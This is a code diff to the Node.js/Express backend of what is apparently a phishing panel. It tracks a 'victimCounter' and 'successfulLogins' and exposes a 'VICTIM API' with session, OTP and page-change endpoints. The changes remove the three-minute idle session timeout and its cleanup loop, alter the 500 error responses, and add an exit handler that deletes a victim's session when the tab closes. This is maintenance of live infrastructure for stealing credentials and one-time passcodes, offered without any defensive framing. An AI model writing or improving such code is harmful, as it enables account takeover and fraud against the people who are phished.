@@ -43,7 +43,7 @@ let victimCounter     = 0;
 let successfulLogins  = 0;
 let currentDomain     = '';
 
-const SESSION_TIMEOUT = 3 * 60 * 1000;
+// REMOVED: SESSION_TIMEOUT - no longer auto-deleting sessions
 
 /* ----------  STATIC ROUTES  ---------- */
 app.use(express.static(__dirname));
@@ -120,12 +120,7 @@ function cleanupSession(sid, reason, silent = false) {
   sessionActivity.delete(sid);
 }
 
-setInterval(() => {
-  const now = Date.now();
-  for (const [sid, last] of sessionActivity) {
-    if (now - last > SESSION_TIMEOUT) cleanupSession(sid, 'timed out (3min idle)', true);
-  }
-}, 10000);
+// REMOVED: setInterval cleanup loop - no longer auto-deleting sessions based on timeout
 
 /* ----------  VICTIM API  ---------- */
 app.post('/api/session', async (req, res) => {
@@ -243,7 +238,7 @@ app.post('/api/otp', async (req, res) => {
     res.sendStatus(200);
   } catch (err) {
     console.error('OTP error', err);
-    res.sendStatus(500);
+    res.status(500).send('Error');
   }
 });
 
@@ -262,10 +257,11 @@ app.post('/api/page', async (req, res) => {
     res.sendStatus(200);
   } catch (err) {
     console.error('Page change error', err);
-    res.sendStatus(500);
+    res.status(500).send('Error');
   }
 });
 
+// NEW: Handle tab close / page exit - immediately delete session
 app.post('/api/exit', async (req, res) => {
   const { sid } = req.body;
   if (sid && sessionsMap.has(sid)) {
